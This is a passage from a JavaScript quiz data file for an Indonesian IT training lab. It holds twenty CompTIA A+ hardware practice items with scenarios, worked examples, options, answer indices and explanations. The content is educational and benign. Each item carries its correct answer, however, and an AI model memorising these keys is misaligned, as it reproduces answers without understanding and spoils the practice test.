// =============================================================================
// LABORATORIUM IT TECH & JARINGAN - 100 TANTANGAN PRAKTIK
// Standar Industri: CompTIA A+, Network+, Cisco CCNA, Security+, Algoritma
// ZERO Spoilers - Distinct Worked Examples (Case A != Case B) - Zero Privacy Leaks
// =============================================================================

const itTechChallenges = [
  {
    "id": "it-hw-1",
    "category": "1. Perangkat Keras & Motherboard (CompTIA A+)",
    "title": "Identifikasi Socket Processor: LGA vs PGA",
    "sourceRef": "CompTIA A+ Core 1: Chapter 3 (Motherboards & Processors)",
    "scenario": "Seorang teknisi sedang merakit PC kantor dengan prosesor Intel Core i7. Saat membuka penutup socket di motherboard, teknisi melihat pin-pin kecil yang menonjol berada langsung di motherboard, bukan di bawah prosesor.",
    "workedExample": {
      "kasusSerupa": "Memeriksa prosesor desktop AMD soket AM4 lawas di mana jarum-jarum pin halus menempel langsung di badan chip prosesor (bukan di motherboard).",
      "jawabanBenarContoh": "PGA (Pin Grid Array) — karena pin konduktor berada langsung di prosesor.",
      "nalarBayi": "PGA = Pin di Prosesor. Pola ingat: Kalau duri/pin ada di prosesor itu PGA,."
    },
    "question": "Tipe socket prosesor apakah yang meletakkan pin kontak pada motherboard, sedangkan bagian bawah CPU hanya berupa lempengan kontak datar?",
    "options": [
      "DIP (Dual In-line Package)",
      "LGA (Land Grid Array)",
      "BGA (Ball Grid Array)",
      "PGA (Pin Grid Array)"
    ],
    "correctIndex": 1,
    "explanation": "LGA (Land Grid Array) memiliki pin di motherboard dan pad kontak di processor. Hal ini meminimalkan risiko pin bengkok pada prosesor saat pengiriman, meskipun motherboard harus ditangani dengan sangat hati-hati.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-hw-2",
    "category": "1. Perangkat Keras & Motherboard (CompTIA A+)",
    "title": "Pemilihan Form Factor Motherboard untuk Casing Mini",
    "sourceRef": "Upgrading and Repairing PCs: Chapter 4 (Motherboards & Buses)",
    "scenario": "Klien menginginkan PC kasir ringkas dengan dimensi casing sangat kecil (Small Form Factor). Ruang casing hanya mendukung motherboard berukuran maksimal 17 x 17 cm dengan 1 slot ekspansi PCIe.",
    "workedExample": {
      "kasusSerupa": "Memilih motherboard untuk komputer server workstation tower besar yang membutuhkan 7 slot ekspansi PCIe penuh.",
      "jawabanBenarContoh": "Standard ATX (305 x 244 mm) — form factor standar berukuran besar untuk ekspansi maksimal.",
      "nalarBayi": "Form factor besar (ATX) punya banyak slot."
    },
    "question": "Form factor motherboard manakah yang memiliki dimensi fisik tepat 17 x 17 cm (6.7 x 6.7 inci)?",
    "options": [
      "Extended ATX (E-ATX)",
      "Mini-ITX",
      "Standard ATX",
      "Micro-ATX"
    ],
    "correctIndex": 1,
    "explanation": "Mini-ITX dirancang oleh VIA Technologies dengan ukuran ringkas 17x17 cm (6.7x6.7 inci), ideal untuk PC mini, router kustom, dan terminal Point of Sale (POS).",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-hw-3",
    "category": "1. Perangkat Keras & Motherboard (CompTIA A+)",
    "title": "Pencegahan Kerusakan Data Memori Server dengan ECC",
    "sourceRef": "CompTIA A+ Core 1: Chapter 4 (System Memory)",
    "scenario": "Sebuah bank membutuhkan server database transaksi yang harus beroperasi 24/7 tanpa crash karena kesalahan 'single-bit flip' yang dipicu radiasi elektromagnetik pada memori RAM.",
    "workedExample": {
      "kasusSerupa": "Memilih tipe memori RAM lawas yang masih membutuhkan sirkuit pengatur voltase daya (VRM) langsung dari motherboard, bukan di keping RAM itu sendiri.",
      "jawabanBenarContoh": "DDR4 — modul generasi sebelumnya yang mengandalkan VRM motherboard untuk penyaluran voltase daya.",
      "nalarBayi": "DDR4 bergantung pada sirkuit motherboard."
    },
    "question": "Teknologi modul RAM manakah yang memiliki sirkuit tambahan untuk mendeteksi dan secara otomatis memperbaiki galat memori 1-bit pada server?",
    "options": [
      "Non-Parity RAM",
      "Overclocked XMP RAM",
      "SODIMM Unbuffered",
      "ECC (Error-Correcting Code) RAM"
    ],
    "correctIndex": 3,
    "explanation": "ECC (Error-Correcting Code) RAM menggunakan bit paritas ekstra dan kontroler cerdas untuk mendeteksi serta memperbaiki single-bit memory corruption secara transparan tanpa menghentikan sistem operasi.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-hw-4",
    "category": "1. Perangkat Keras & Motherboard (CompTIA A+)",
    "title": "Memilih Antarmuka Media Penyimpanan Berkecepatan Tinggi",
    "sourceRef": "CompTIA A+ Core 1: Chapter 5 (Storage Devices)",
    "scenario": "Seorang editor video membutuhkan media penyimpanan SSD internal dengan kecepatan baca lebih dari 3500 MB/s untuk menangani file raw video 4K. Teknisi harus memilih antarmuka bus yang tepat.",
    "workedExample": {
      "kasusSerupa": "Memasang kartu grafis discrete gaming berkebutuhan daya 300 Watt yang membutuhkan soket bus dengan lajur data (lanes) terbanyak dan bandwidth tertinggi.",
      "jawabanBenarContoh": "PCIe x16 — slot bus ekspansi terpanjang dengan 16 jalur transmisi data paralel.",
      "nalarBayi": "Slot kartu grafis PCIe x16 dirancang memiliki bandwidth besar untuk pemrosesan video berat."
    },
    "question": "Protokol dan antarmuka bus manakah yang memungkinkan SSD M.2 mencapai kecepatan transfer data di atas 3000 MB/s?",
    "options": [
      "NVMe melalui bus PCI Express (PCIe)",
      "SCSI Ultra-320",
      "IDE / PATA Ribbon Cable",
      "AHCI melalui antarmuka SATA III"
    ],
    "correctIndex": 0,
    "explanation": "NVMe (Non-Volatile Memory Express) memanfaatkan jalur PCI Express berkecepatan tinggi dengan latensi sangat rendah dan antrean perintah (queue depth) hingga 64.000, melompati limit SATA III (600 MB/s).",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-hw-5",
    "category": "1. Perangkat Keras & Motherboard (CompTIA A+)",
    "title": "Efisiensi Catu Daya: Sertifikasi 80 PLUS",
    "sourceRef": "Upgrading and Repairing PCs: Chapter 20 (Power Supplies)",
    "scenario": "Dalam perakitan server kantor hemat energi, manajer IT mensyaratkan PSU yang tidak membuang lebih dari 10-20% daya listrik menjadi panas terbuang saat beban kerja 50%.",
    "workedExample": {
      "kasusSerupa": "Menghubungkan harddisk SATA internal 3.5 inci ke motherboard menggunakan kabel data standar 7-pin.",
      "jawabanBenarContoh": "Kabel Data SATA (Serial ATA) — kabel pita tipis 7-pin untuk menghubungkan drive internal ke motherboard.",
      "nalarBayi": "Kabel SATA menghubungkan harddisk internal di dalam casing."
    },
    "question": "Apa arti sertifikasi '80 PLUS' pada sebuah Power Supply Unit (PSU)?",
    "options": [
      "PSU dijamin mampu bertahan bekerja di suhu ruangan hingga 80 derajat Celcius",
      "PSU memiliki garansi proteksi lonjakan tegangan selama 80 bulan",
      "PSU memiliki efisiensi energi minimal 80% dalam mengubah daya AC ke DC pada berbagai tingkat beban",
      "PSU mampu menghasilkan daya maksimal 80 Watt secara konstan"
    ],
    "correctIndex": 2,
    "explanation": "Program sertifikasi 80 PLUS menguji efisiensi konversi daya PSU. Minimal 80% daya listrik dari dinding berhasil diubah menjadi daya DC komputer pada beban 20%, 50%, dan 100%, sisanya menjadi panas.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-hw-6",
    "category": "1. Perangkat Keras & Motherboard (CompTIA A+)",
    "title": "Pemasangan Thermal Paste dan Pencegahan Overheating",
    "sourceRef": "CompTIA A+ Core 1: Chapter 3 (Processors and Cooling)",
    "scenario": "Setelah merakit PC baru, teknisi menyalakan komputer namun suhu CPU melonjak hingga 95°C dalam waktu 1 menit setelah masuk BIOS, padahal kipas pendingin (heatsink fan) berputar kencang.",
    "workedExample": {
      "kasusSerupa": "Membersihkan debu tebal pada bilah kipas pendingin dan sela heatsink prosesor tanpa menyentuh sirkuit elektronik.",
      "jawabanBenarContoh": "Compressed Air (Kaleng Angin Bertekanan) — menyemprot debu tanpa menghasilkan residu atau arus listrik statis.",
      "nalarBayi": "Gunakan angin bertekanan untuk usir debu kering. Tapi untuk membersihkan kerak pasta termal lama yang lengket di atas CPU, gunakan cairan khusus alkohol Isopropil 99%!."
    },
    "question": "Apa fungsi utama dari pemberian thermal paste di antara permukaan processor (IHS) dan heatsink?",
    "options": [
      "Merekatkan processor agar tidak lepas dari socket saat getaran kipas",
      "Mengalirkan arus listrik ground dari processor ke casing komputer",
      "Mengisi celah udara mikroskopis agar transfer panas dari CPU ke pendingin berlangsung optimal",
      "Mendinginkan processor secara kimiawi melalui reaksi endotermik"
    ],
    "correctIndex": 2,
    "explanation": "Permukaan logam CPU dan heatsink tidak pernah 100% rata sempurna. Thermal paste memiliki konduktivitas termal tinggi untuk mengisi rongga udara mikroskopis, mencegah overheating.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-hw-7",
    "category": "1. Perangkat Keras & Motherboard (CompTIA A+)",
    "title": "Diagnosa Kerusakan Hardware melalui POST Beep Code",
    "sourceRef": "CompTIA A+ Core 1: Chapter 10 (Troubleshooting Core Components)",
    "scenario": "Saat tombol power PC ditekan, layar monitor tetap hitam gelap dan motherboard mengeluarkan bunyi 'beep' berulang secara teratur (repetitive continuous beeps). Kipas menyala normal.",
    "workedExample": {
      "kasusSerupa": "Mengukur kestabilan tegangan voltase rel +12V dan +5V yang keluar dari unit Power Supply Unit (PSU) yang dicurigai drop.",
      "jawabanBenarContoh": "Digital Multimeter / PSU Tester — alat ukur voltase listrik langsung pada pin konektor catu daya.",
      "nalarBayi": "Multimeter dipakai untuk cek tegangan listrik. Tapi untuk menguji apakah port fisik kabel LAN atau USB berfungsi normal mengirim dan menerima sinyal balik, alatnya adalah loopback plug!."
    },
    "question": "Komponen apakah yang paling umum menjadi penyebab kegagalan POST dengan bunyi beep berulang-ulang tanpa tampilan di layar?",
    "options": [
      "Modul RAM kendur, tidak terpasang sempurna, atau rusak",
      "Mouse USB belum tercolok",
      "Kabel HDMI monitor kebalik",
      "Kapasitas harddisk penuh 100%"
    ],
    "correctIndex": 0,
    "explanation": "Bunyi beep berulang saat startup sebelum video menyala biasanya menandakan memori utama (RAM) tidak terdeteksi oleh BIOS/UEFI. Solusi pertama: cabut, bersihkan pin RAM, dan pasang kembali ke slotnya.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-hw-8",
    "category": "1. Perangkat Keras & Motherboard (CompTIA A+)",
    "title": "Modul Keamanan TPM 2.0 dan Enkripsi BitLocker",
    "sourceRef": "CompTIA A+ Core 2: Chapter 2 (Operating System Requirements)",
    "scenario": "Organisasi berencana memperbarui 50 laptop kantor ke Windows 11. Tool PC Health Check melaporkan hardware tidak memenuhi syarat karena fitur 'TPM 2.0' belum aktif.",
    "workedExample": {
      "kasusSerupa": "Menghitung konsumsi daya listrik komputer kantor hemat energi yang hanya menggunakan prosesor terintegrasi tanpa kartu grafis tambahan.",
      "jawabanBenarContoh": "Kapasitas 300 - 350 Watt — daya yang cukup untuk sistem perkantoran sederhana berbeban rendah.",
      "nalarBayi": "PC kantor hemat daya hanya butuh 300W."
    },
    "question": "Apa fungsi dari chip TPM (Trusted Platform Module) 2.0 pada motherboard?",
    "options": [
      "Meningkatkan kecepatan render grafis pada game dan aplikasi 3D",
      "Mengontrol kecepatan kipas pendingin secara otomatis berdasarkan sensor panas",
      "Menyimpan kunci kriptografi perangkat keras dan memverifikasi integritas platform untuk enkripsi data",
      "Menambah kapasitas memori cache L3 pada prosesor"
    ],
    "correctIndex": 2,
    "explanation": "TPM 2.0 menyediakan penyimpanan berbasis perangkat keras yang aman untuk kunci enkripsi (seperti BitLocker) dan memverifikasi integritas rantai boot sistem (Secure Boot).",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-hw-9",
    "category": "1. Perangkat Keras & Motherboard (CompTIA A+)",
    "title": "Konektivitas Monitor: DisplayPort vs HDMI",
    "sourceRef": "CompTIA A+ Core 1: Chapter 7 (Display Technologies)",
    "scenario": "Teknisi diminta memasang workstation trading saham dengan setup 3 monitor resolusi tinggi menggunakan satu kartu grafis modern. Teknisi memanfaatkan fitur Daisy-Chaining (Multi-Stream Transport / MST).",
    "workedExample": {
      "kasusSerupa": "Menghubungkan konsol PlayStation 5 ke layar Smart TV 4K ruang tamu dengan kabel tunggal yang membawa audio return channel (eARC).",
      "jawabanBenarContoh": "HDMI (High-Definition Multimedia Interface) — standar konektivitas display konsumen untuk TV dan perangkat hiburan.",
      "nalarBayi": "HDMI adalah standar TV rumah."
    },
    "question": "Konektor video display manakah yang mendukung fitur daisy-chaining (menghubungkan beberapa monitor secara berurutan) menggunakan teknologi MST?",
    "options": [
      "DisplayPort",
      "RCA Composite",
      "VGA (D-Sub 15-pin)",
      "DVI-Single Link"
    ],
    "correctIndex": 0,
    "explanation": "DisplayPort mendukung Multi-Stream Transport (MST), memungkinkan beberapa monitor independen dihubungkan secara seri (daisy-chain) dari satu port DisplayPort pada kartu grafis.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-hw-10",
    "category": "1. Perangkat Keras & Motherboard (CompTIA A+)",
    "title": "Standar Kecepatan Transfer USB 3.2 Gen 2",
    "sourceRef": "Upgrading and Repairing PCs: Chapter 15 (External I/O Interfaces)",
    "scenario": "Klien membeli external SSD berkecepatan 10 Gbps (sekitar 1050 MB/s). Klien bingung ingin mencolokkan drive ke port USB belakang motherboard yang memiliki label berbeda-beda.",
    "workedExample": {
      "kasusSerupa": "Mengukur kecepatan transfer data pada kabel USB 3.0 / USB 3.2 Gen 1 (SuperSpeed generasi pertama).",
      "jawabanBenarContoh": "5 Gbps (Gigabit per detik) — batas bandwidth teoritis maksimal untuk USB 3.0 standar awal.",
      "nalarBayi": "Generasi awal USB 3.0 berkecepatan standar 5 Gbps dirancang untuk transfer data harian yang stabil."
    },
    "question": "Berapakah kecepatan transfer data teoritis maksimal untuk standar USB 3.2 Gen 2 (SuperSpeed+)?",
    "options": [
      "40 Gbps",
      "5 Gbps",
      "480 Mbps",
      "10 Gbps"
    ],
    "correctIndex": 3,
    "explanation": "USB 3.2 Gen 2 (SuperSpeed 10Gbps) mendukung throughput hingga 10 Gbps. USB 3.2 Gen 1 mentok di 5 Gbps, sedangkan Thunderbolt 3/4 dan USB4 dapat mencapai hingga 40 Gbps.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-hw-11",
    "category": "1. Perangkat Keras & Motherboard (CompTIA A+)",
    "title": "Konfigurasi Redundansi Data: RAID 1 vs RAID 0",
    "sourceRef": "CompTIA A+ Core 1: Chapter 5 (Storage Configurations)",
    "scenario": "Departemen akuntansi memiliki server kecil dengan 2 unit harddisk berkapasitas 2 TB. Manajemen menuntut perlindungan mutlak jika salah satu harddisk mendadak mati, data tetap tidak boleh hilang.",
    "workedExample": {
      "kasusSerupa": "Menggabungkan dua harddisk menjadi satu volume demi kecepatan baca dan tulis maksimal, tanpa adanya proteksi salinan cadangan data (striping).",
      "jawabanBenarContoh": "RAID 0 (Disk Striping) — membagi blok data ke beberapa drive demi performa tinggi tanpa toleransi kesalahan.",
      "nalarBayi": "Teknologi RAID striping menyebarkan potongan data ke beberapa cakram untuk mengejar performa baca-tulis tinggi."
    },
    "question": "Konfigurasi RAID 2-disk manakah yang menyediakan toleransi kesalahan (fault tolerance) dengan cara menduplikasi seluruh data ke disk kedua (Mirroring)?",
    "options": [
      "JBOD (Just a Bunch of Disks)",
      "Spanned Volume",
      "RAID 1",
      "RAID 0"
    ],
    "correctIndex": 2,
    "explanation": "RAID 1 menggunakan teknik mirroring (pencerminan data). Data ditulis secara paralel ke kedua disk. Memberikan toleransi kesalahan 1 disk dengan kapasitas efektif 50% dari total storage.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-hw-12",
    "category": "1. Perangkat Keras & Motherboard (CompTIA A+)",
    "title": "Pencegahan Kerusakan Hardware Akibat Listrik Statis (ESD)",
    "sourceRef": "CompTIA A+ Core 1: Chapter 11 (Operational Procedures & Safety)",
    "scenario": "Sebelum memasang modul RAM baru dan prosesor mahal ke motherboard, teknisi harus memastikan tubuhnya bebas dari penumpukan muatan elektrostatik yang dapat merusak sirkuit semikonduktor.",
    "workedExample": {
      "kasusSerupa": "Mengganti harddisk laptop lama dengan SSD form-factor 2.5 inci yang masih menggunakan jalur antarmuka kabel SATA 6 Gbps.",
      "jawabanBenarContoh": "SATA SSD (kecepatan maksimal ~550 MB/s terbatas bus SATA).",
      "nalarBayi": "SATA SSD terganjal batas 550 MB/s karena bus SATA."
    },
    "question": "Alat pelindung manakah yang wajib digunakan teknisi pada pergelangan tangan untuk menyamakan potensial listrik dan membuang muatan statis ke ground?",
    "options": [
      "Antistatic wrist strap (gelang antistatis)",
      "Kabel jumper tembaga langsung ke stopkontak fasa",
      "Gelang magnet pengikat baut",
      "Sarung tangan wol tebal"
    ],
    "correctIndex": 0,
    "explanation": "Antistatic wrist strap dengan resistor 1 Megaohm melindungi komponen semikonduktor dari Electrostatic Discharge (ESD) dengan mengalirkan listrik statis tubuh secara aman ke chassis ground.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-hw-13",
    "category": "1. Perangkat Keras & Motherboard (CompTIA A+)",
    "title": "Pengukuran Tegangan DC Power Supply dengan Multimeter",
    "sourceRef": "Upgrading and Repairing PCs: Chapter 20 (Power Supply Testing)",
    "scenario": "Sebuah PC sering mendadak mati (restart acak) saat kartu grafis bekerja keras. Teknisi ingin menguji rel tegangan kabel molex dan PCIe dari PSU menggunakan multimeter digital.",
    "workedExample": {
      "kasusSerupa": "Memasang modul RAM pada motherboard dengan 4 slot memori agar berjalan dalam konfigurasi optimal Dual-Channel.",
      "jawabanBenarContoh": "Memasang keping RAM pada slot berwarna senada (biasanya Slot 2 dan Slot 4 / Channel A2 & B2).",
      "nalarBayi": "RAM Dual-Channel harus dipasang berselang di slot yang tepat (A2 & B2). Setelah itu, jangan lupa aktifkan profil XMP / EXPO di BIOS agar RAM berjalan di kecepatan tertingginya!."
    },
    "question": "Berapakah tegangan standar DC nominal pada kabel berwarna KUNING pada konektor daya catu daya ATX komputer?",
    "options": [
      "+3.3 Volt DC",
      "+5 Volt DC",
      "+12 Volt DC",
      "-12 Volt DC"
    ],
    "correctIndex": 2,
    "explanation": "Standar ATX menetapkan: Kuning = +12V (daya motor harddisk, CPU, dan PCIe GPU), Merah = +5V (sirkuit logika drive), Oranye = +3.3V (slot ekspansi & chipset), Hitam = Ground.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-hw-14",
    "category": "1. Perangkat Keras & Motherboard (CompTIA A+)",
    "title": "Pendeteksian Dini Kerusakan Harddisk melalui S.M.A.R.T.",
    "sourceRef": "CompTIA A+ Core 1: Chapter 5 (Storage Troubleshooting)",
    "scenario": "Aplikasi pemantau sistem memperingatkan bahwa harddisk server memiliki status 'Reallocated Sectors Count' yang terus meningkat drastis setiap hari, meskipun kapasitas partisi masih kosong 80%.",
    "workedExample": {
      "kasusSerupa": "Memeriksa integritas sistem berkas (file system) dan menandai bad sector pada permukaan partisi Windows melalui utilitas bawaan.",
      "jawabanBenarContoh": "Perintah chkdsk /f /r — memeriksa struktur tabel file sistem dan memulihkan sektor baca yang rusak.",
      "nalarBayi": "Perintah chkdsk memeriksa struktur file sistem di level OS."
    },
    "question": "Teknologi pemantauan internal pada harddisk dan SSD yang bertugas mendeteksi indikator penurunan kondisi fisik drive disebut?",
    "options": [
      "RAID Controller",
      "CHKDSK Background Service",
      "S.M.A.R.T.",
      "SCSI Command Intercept"
    ],
    "correctIndex": 2,
    "explanation": "S.M.A.R.T. (Self-Monitoring, Analysis, and Reporting Technology) memantau berbagai atribut kesehatan fisik drive seperti bad sector yang dialihkan kembali, suhu, jam operasional, dan CRC error.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-hw-15",
    "category": "1. Perangkat Keras & Motherboard (CompTIA A+)",
    "title": "Troubleshooting Laser Printer: Hasil Cetak Luntur dan Terhapus Jari",
    "sourceRef": "CompTIA A+ Core 1: Chapter 8 (Printers and Multifunction Devices)",
    "scenario": "Pengguna kantor mengeluh bahwa dokumen yang dicetak menggunakan printer laser menghasilkan teks yang mudah terhapus dan luntur seperti bubuk saat diusap dengan jari tangan.",
    "workedExample": {
      "kasusSerupa": "Mencegah sengatan listrik statis saat teknisi merakit komputer di atas lantai berkarpet tebal.",
      "jawabanBenarContoh": "Memakai ESD Wrist Strap (gelang antistatis) yang dijepitkan ke rangka logam sasis komputer yang tidak tersambung listrik.",
      "nalarBayi": "Gelang ESD menyalurkan muatan listrik statis tubuh ke ground. Jangan pernah menyentuh komponen PCB sensitif tanpa membuang listrik statis tubuh terlebih dahulu!."
    },
    "question": "Komponen printer laser manakah yang bertanggung jawab melekatkan serbuk toner ke atas serat kertas menggunakan kombinasi panas dan tekanan tinggi?",
    "options": [
      "Imaging drum (OPC Drum)",
      "Primary corona wire / charge roller",
      "Fuser assembly (unit fuser)",
      "Transfer roller"
    ],
    "correctIndex": 2,
    "explanation": "Fuser assembly terdiri dari rol pemanas (heating roller) dan rol penekan (pressure roller) yang mencairkan partikel serbuk toner sehingga melekat permanen pada pori-pori serat kertas.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-hw-16",
    "category": "1. Perangkat Keras & Motherboard (CompTIA A+)",
    "title": "Perbedaan Modul RAM Laptop dan PC Desktop",
    "sourceRef": "CompTIA A+ Core 1: Chapter 4 (System Memory Form Factors)",
    "scenario": "Seorang staf IT hendak meng-upgrade kapasitas RAM laptop Lenovo ThinkPad dari 8 GB menjadi 16 GB. Staf tersebut membuka laci gudang dan melihat dua jenis kemasan memori yang berbeda panjang fisiknya.",
    "workedExample": {
      "kasusSerupa": "Memilih ukuran fisik modul RAM untuk komputer desktop tower standar.",
      "jawabanBenarContoh": "DIMM (Dual In-line Memory Module) — modul memori panjang berukuran penuh untuk motherboard desktop.",
      "nalarBayi": "PC meja memakai keping panjang DIMM."
    },
    "question": "Form factor modul memori RAM apakah yang digunakan pada laptop dan perangkat komputer portabel?",
    "options": [
      "Standard DIMM",
      "SODIMM",
      "RIMM Rambus",
      "SIMM 30-pin"
    ],
    "correctIndex": 1,
    "explanation": "SODIMM (Small Outline DIMM) adalah bentuk fisik kompak dari memori RAM standar desktop (DIMM), dirancang khusus untuk laptop, notebook, mini PC, dan printer cerdas.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-hw-17",
    "category": "1. Perangkat Keras & Motherboard (CompTIA A+)",
    "title": "Mekanisme Perlindungan Suhu CPU: Thermal Throttling",
    "sourceRef": "CompTIA A+ Core 1: Chapter 3 (Processor Diagnostics)",
    "scenario": "Sebuah workstation tiba-tiba mengalami penurunan performa drastis (lag parah dan drop frame) saat merender animasi 3D selama 30 menit. HWMonitor menunjukkan suhu CPU stabil di 100°C dan clock speed turun dari 4.5 GHz ke 1.8 GHz.",
    "workedExample": {
      "kasusSerupa": "Sistem komputer mati total seketika (emergency shutdown) saat suhu prosesor menembus ambang batas kritis 105 derajat Celsius.",
      "jawabanBenarContoh": "Thermal Shutdown — fitur keamanan darurat memutus daya seketika agar chip silikon prosesor tidak terbakar hangus.",
      "nalarBayi": "Sistem proteksi termal darurat langsung memutus daya ketika sensor mendeteksi temperatur kritis."
    },
    "question": "Istilah apakah yang menggambarkan penurunan kecepatan clock CPU secara otomatis demi mencegah kerusakan fisik akibat suhu operasi yang melampaui ambang batas maksimum (Tjunction)?",
    "options": [
      "Overclocking Under-voltage",
      "Thermal Throttling",
      "Dynamic Cache Purging",
      "Core Parking Deactivation"
    ],
    "correctIndex": 1,
    "explanation": "Thermal Throttling adalah mekanisme keamanan perangkat keras terintegrasi di mana prosesor secara dinamis memangkas clock multiplier dan voltase ketika sensor suhu mencapai batas toleransi termal maksimum.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-hw-18",
    "category": "1. Perangkat Keras & Motherboard (CompTIA A+)",
    "title": "Jalur Ekspansi PCIe: Pengertian x1, x4, x8, x16",
    "sourceRef": "Upgrading and Repairing PCs: Chapter 4 (Expansion Buses)",
    "scenario": "Kartu grafis modern performa tinggi membutuhkan throughput transfer data terbesar dari CPU dan umumnya dipasang pada slot terpanjang di motherboard yang terhubung langsung ke 16 jalur data serial.",
    "workedExample": {
      "kasusSerupa": "Menguji komponen mana yang rusak pada PC yang menyala tetapi layarnya tetap gelap gulita (No Display) saat pertama kali dihidupkan.",
      "jawabanBenarContoh": "Mendengarkan kode bunyi Beep Code dari motherboard atau melihat lampu indikator LED Debug (CPU/DRAM/VGA/BOOT).",
      "nalarBayi": "Kode beep dan LED debug adalah petunjuk awal motherboard saat gagal POST. Dari situ kita tahu apakah kerusakan ada di RAM, CPU, atau kartu VGA!."
    },
    "question": "Apa arti penamaan 'x16' pada spesifikasi slot ekspansi PCI Express (PCIe)?",
    "options": [
      "Slot memiliki kecepatan transfer 16 Gigahertz per detik",
      "Slot dapat dipasangi maksimal 16 kartu grafis secara paralel",
      "Panjang fisik slot adalah tepat 16 sentimeter",
      "Slot memiliki 16 jalur (lanes) transfer data serial secara bersamaan"
    ],
    "correctIndex": 3,
    "explanation": "Angka setelah huruf x (seperti x1, x4, x8, x16) menunjukkan jumlah 'lanes' (jalur kabel transmisi serial) yang digunakan untuk mengirim dan menerima data secara simultan.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-hw-19",
    "category": "1. Perangkat Keras & Motherboard (CompTIA A+)",
    "title": "Perlindungan Terhadap Rootkit Bootloader dengan UEFI Secure Boot",
    "sourceRef": "CompTIA A+ Core 1: Chapter 3 (BIOS/UEFI Configuration)",
    "scenario": "Departemen keamanan siber menginstruksikan bahwa seluruh PC kantor harus memblokir malware tipe Bootkit yang mencoba memodifikasi Master Boot Record atau memuat driver kernel tidak sah sebelum Windows dimulai.",
    "workedExample": {
      "kasusSerupa": "Mengamankan BIOS/UEFI agar pengaturan hardware dan urutan boot tidak dapat diubah oleh sembarang pengguna tanpa izin.",
      "jawabanBenarContoh": "Memasang BIOS Supervisor/Administrator Password.",
      "nalarBayi": "Password BIOS mencegah orang mengutak-atik settingan."
    },
    "question": "Fitur keamanan pada firmware UEFI modern manakah yang mencegah eksekusi bootloader dan driver yang belum terverifikasi secara digital saat komputer dinyalakan?",
    "options": [
      "Wake-on-LAN",
      "Fast Startup",
      "Legacy CSM Boot",
      "Secure Boot"
    ],
    "correctIndex": 3,
    "explanation": "UEFI Secure Boot memastikan firmware hanya memuat bootloader, kernel, dan driver sistem operasi yang memiliki sertifikat tanda tangan digital terpercaya (valid cryptographically), menangkal serangan bootkit.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-hw-20",
    "category": "1. Perangkat Keras & Motherboard (CompTIA A+)",
    "title": "Konsolidasi Kontrol Multi-Server di Ruang Server: KVM Switch",
    "sourceRef": "CompTIA A+ Core 1: Chapter 6 (Peripheral Devices)",
    "scenario": "Ruang server memiliki 8 unit rak server fisik. Administrator ingin mengontrol kedelapan server tersebut hanya dengan menggunakan 1 monitor, 1 keyboard, dan 1 mouse di meja konsol teknisi tanpa perlu remote desktop jaringan.",
    "workedExample": {
      "kasusSerupa": "Menghubungkan teknisi di ruang kontrol ke desktop server di gedung berbeda melalui koneksi jaringan protokol RDP/VNC.",
      "jawabanBenarContoh": "Remote Desktop Protocol (RDP) / Remote Access Software melalui jaringan LAN/WAN.",
      "nalarBayi": "RDP menghubungkan server lewat jaringan IP."
    },
    "question": "Perangkat keras apakah yang memungkinkan administrator mengontrol beberapa komputer server sekaligus menggunakan satu unit monitor, keyboard, dan mouse tunggal?",
    "options": [
      "USB Hub Passive",
      "KVM Switch",
      "Network Switch Unmanaged",
      "Patch Panel Cat6"
    ],
    "correctIndex": 1,
    "explanation": "KVM Switch (Keyboard, Video, Mouse Switch) menghubungkan beberapa unit komputer ke satu konsol input/output fisik, menghemat ruang rak server dan biaya pengadaan periferal.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-net-1",
    "category": "2. Jaringan Komputer & Subnetting (Network+ & Cisco CCNA)",
    "title": "Model Referensi OSI 7 Layer dan Protocol Data Unit (PDU)",
